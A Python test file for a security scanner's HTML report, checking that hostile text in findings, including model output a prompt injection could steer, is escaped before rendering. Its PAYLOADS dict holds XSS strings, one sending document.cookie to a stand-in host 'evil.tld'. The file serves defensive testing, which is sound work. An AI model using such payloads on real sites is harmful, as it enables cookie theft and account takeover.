"""
test_report_escaping.py -- proves the HTML report cannot be made to execute code.

WHY THIS TEST EXISTS
    report.py renders text that a hostile project controls: file paths, source
    lines, credential values, and -- most importantly -- model output, which a
    prompt injection in the scanned code can steer. If any of it reached the
    document unescaped, scanning a malicious repo and opening the report would
    run the attacker's JavaScript on the analyst's machine. A scanner that
    compromises you for running it is worse than no scanner.

    So this is not a formatting test. It is the test for a security control, and
    it must keep passing as report.py's templates change.

Run it directly:  python test_report_escaping.py
Exit code is 0 on pass, 1 on failure, so it drops into CI unchanged.
"""

import re
import sys

import report

# Each payload targets a different escape that a naive template forgets.
PAYLOADS = {
    "script tag": "<script>alert('xss')</script>",
    "attribute break-out": "\"><img src=x onerror=alert('xss')>",
    "single-quote attribute": "' onmouseover='alert(1)",
    "container break-out": "</pre></div><script>fetch('//evil.tld?c='+document.cookie)</script>",
    "svg handler": "<svg/onload=alert(1)>",
    "html comment": "<!--><script>alert(1)</script>",
}


def _record(payload):
    """A finding with the payload in every attacker-reachable field."""
    return {
        "check_id": f"vibesec.test.{payload}",
        "path": f"src/{payload}/app.py",
        "line": 1,
        "engine": "semgrep",
        "also_matched": [payload],
        "metadata": {
            "redacted": payload, "exposure": payload, "confidence": "medium",
            "cve_ids": [payload], "fixed_version": payload, "cvss_score": 9.8,
        },
        "explanation": {
            "is_real_vulnerability": True,
            "severity": "critical",
            "what_it_is": payload,
            "attacker_scenario": payload,
            "fix": payload,
        },
        "error": None,
    }


def _engine_record(payload):
    """Same, but on the engine-answered path, which renders `fix` as prose."""
    record = _record(payload)
    record["engine"] = "secrets"
    record["explanation"]["explained_by"] = "engine"
    return record


def main():
    records = ([_record(p) for p in PAYLOADS.values()]
               + [_engine_record(p) for p in PAYLOADS.values()])
    # The skipped-engine banner renders text too, and its "reason" is a scanner
    # error message -- which routinely quotes a path from the scanned repo, so it
    # is as attacker-influenced as anything else in the document.
    skipped = [(payload, payload) for payload in PAYLOADS.values()]
    # The target label is attacker-influenced too -- it reaches <title>.
    document = report.render(records, PAYLOADS["script tag"], 12, 12, skipped=skipped)

    failures = []

    for name, payload in PAYLOADS.items():
        if payload in document:
            failures.append(f"raw payload survived ({name}): {payload!r}")

    # A template could escape the text and still leave an injected tag behind,
    # so check the document's structure, not just its substrings.
    script_tags = len(re.findall(r"<script", document, re.IGNORECASE))
    if script_tags != 1:
        failures.append(f"expected exactly 1 <script> (ours), found {script_tags}")

    for handler in ("onerror=", "onload=", "onmouseover="):
        if re.search(r"<[^>]*\s" + re.escape(handler), document, re.IGNORECASE):
            failures.append(f"live event handler in markup: {handler}")

    # Escaping that silently drops content would pass every check above.
    for expected in ("&lt;script&gt;", "&lt;img", "&lt;svg/onload", "&#x27;"):
        if expected not in document:
            failures.append(f"expected escaped form missing: {expected}")

    # The report must not reach the network, whatever it is rendering.
    for url in re.findall(r"https?://[^\s\"'<>]+", document):
        failures.append(f"external URL in document: {url}")

    if failures:
        print(f"FAIL ({len(failures)} problem(s))")
        for failure in failures:
            print(f"  - {failure}")
        return 1

    print(f"PASS  {len(records)} hostile findings rendered, nothing escaped the sandbox")
    print(f"      {len(PAYLOADS)} payloads x 2 render paths, {len(document)} bytes")
    return 0


if __name__ == "__main__":
    sys.exit(main())
